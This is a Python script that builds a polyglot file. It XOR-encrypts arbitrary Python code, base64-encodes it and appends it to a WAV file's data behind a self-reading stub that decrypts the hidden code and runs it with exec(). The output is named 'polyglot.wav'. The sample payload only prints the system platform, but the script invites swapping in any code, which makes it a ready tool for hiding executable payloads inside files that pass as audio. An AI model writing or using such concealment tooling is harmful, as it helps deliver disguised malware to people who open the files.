import base64
import random

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def xor_decrypt_code(key_var: str = "key") -> str:
    return f'''
def xor_decrypt(data, {key_var}):
    return bytes([b ^ {key_var}[i % len({key_var})] for i, b in enumerate(data)])
'''.strip()

def embed_xor_payload(payload_code: str, wav_path: str, output_path: str):
    key = bytes([random.randint(1, 255) for _ in range(8)])  # 8-byte XOR key
    encrypted_payload = xor_encrypt(payload_code.encode(), key)
    encrypted_b64 = base64.b64encode(encrypted_payload).decode()
    key_repr = repr(key)

    # Python stub to decrypt and execute
    python_stub = f'''#!/usr/bin/env python3
# XOR-encrypted Python + WAV polyglot

import base64

{xor_decrypt_code()}

with open(__file__, "rb") as f:
    data = f.read()

marker = b"#--PAYLOAD_START--\\n"
start = data.find(marker) + len(marker)
payload_enc = data[start:].strip()
decoded = base64.b64decode(payload_enc)
decrypted = xor_decrypt(decoded, {key_repr})
exec(decrypted.decode())
'''.encode()

    with open(wav_path, "rb") as wav:
        wav_data = wav.read()

    with open(output_path, "wb") as out:
        out.write(python_stub)
        out.write(b"\n#--WAV_START--\n")
        out.write(wav_data)
        out.write(b"\n#--PAYLOAD_START--\n")
        out.write(encrypted_b64.encode())

    print(f"✅ Polyglot created: {output_path}")

# 🔥 Sample payload (swap this out)
payload = '''
import platform
print("✅ XOR payload running!")
print("System platform:", platform.system())
'''

# 🔧 Replace 'input.wav' with any real WAV file
embed_xor_payload(payload_code=payload, wav_path="input.wav", output_path="polyglot.wav")
